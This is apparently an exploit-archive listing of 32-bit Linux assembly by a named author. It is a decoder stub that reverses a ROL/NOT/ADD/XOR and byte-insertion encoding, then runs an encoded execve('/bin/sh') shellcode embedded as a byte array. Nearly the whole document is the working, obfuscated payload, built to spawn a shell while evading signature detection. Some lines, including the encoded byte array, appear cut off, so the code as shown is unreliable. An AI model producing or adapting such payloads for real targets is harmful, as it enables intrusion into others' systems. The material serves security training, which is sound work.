;; Title	        : Linux/x86 Decoder - ROL/NOT/ADD/XOR execve(/bin/sh) Shellcode (114 bytes)
;; Author	        : Xenofon Vassilakopoulos 
;; Date	                : December, 2019
;; Tested on	        : Linux kali 5.3.0-kali2-686-pae #1 SMP Debian 5.3.9-3kali1 (2019-11-20) i686 GNU/Linux
;; Architecture	        : i686 GNU/Linux
;; Shellcode Length	: 114 bytes
;; SLAE-ID 	        : SLAE - 1314 


global _start

section .text

_start:
        jmp short call_shellcode

decoder:
        pop esi                 ; load encoded shellcode in esi register
        push esi                ; keep the initial shellcode in stack to use it later
        xor ebx, ebx            ; zero out ebx
        xor ecx, ecx            ; zero out ecx
        xor edx, edx            ; zero out edx
        mov dl, len             ; put len inside dl lower register in order to avoid nulls

scheme:
        ;; apply the decode scheme
        rol byte [esi], 4       ; apply the rol method to byte pointed by esi to rotate 4 bits left
        not byte [esi]          ; perform one's complement to byte pointed by esi
        add byte [esi], 2       ; add 2 bits to byte pointed by esi
        xor byte [esi], 0x2c    ; perform xor with the value 0x2c to byte pointed by esi

        inc esi                 ; increase esi to point to the next byte
        cmp cl, dl              ; compare the counter at cl lower register with shellcode length contained in dl lower regis$
        je  init                ; if values are equal the first scheme applied succesfully so jump to init tag
        inc cl                  ; if values are not equal increase the counter
        jmp short scheme        ; then jump to rotate tag to get the next byte

init:
        pop esi                 ; load the decoded shellcode from previous decode scheme into esi
        lea edi, [esi +1]       ; point to the next byte
        xor eax, eax            ; zero out eax
        mov al, 1               ; move one to lower register al in order to avoid nulls
        xor ecx, ecx            ; zero out ecx

decode:
        ;; apply the insertion decoding scheme
        cmp cl, dl                      ; compare counter value at low byte register cl with the length of the shellcode
        je EncodedShellcode             ; jump to the decoded shellocde if the counter reached the length of the shellcode
        mov bl, byte [esi + eax + 1]    ; move the value pointed by esi register plus the current value of eax plus one
        mov byte [edi], bl              ; mov the value contained in low byte register to the memory location pointed by edi
        inc edi                         ; increase edi to point to the next memory location ( next byte )
        inc cl                          ; increase counter
        add al, 2                       ; add 2 at low byte register al
        jmp short decode                ; jump to the decode label

call_shellcode:
        call decoder
        EncodedShellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6>
        len equ $-EncodedShellcode
